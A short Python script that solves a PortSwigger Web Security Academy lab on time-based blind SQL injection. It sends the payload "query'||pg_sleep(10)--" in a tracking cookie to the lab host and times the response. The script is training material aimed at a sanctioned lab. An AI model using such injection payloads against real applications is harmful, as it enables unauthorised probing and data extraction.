#!/usr/bin/env python

'''This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

Lab link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
'''

import requests


lab_id = '0a0300da030a4f49c0dda09100ea007b' #change based on generated lab
query = "query'||pg_sleep(10)--" #vulnerable query
uri = f"https://{lab_id}.web-security-academy.net"
cookies = {'TrackingId': query}

r = requests.get(uri, cookies=cookies)
if int(r.elapsed.total_seconds()) == 10:
    print("solved")
else:
    print("nope")
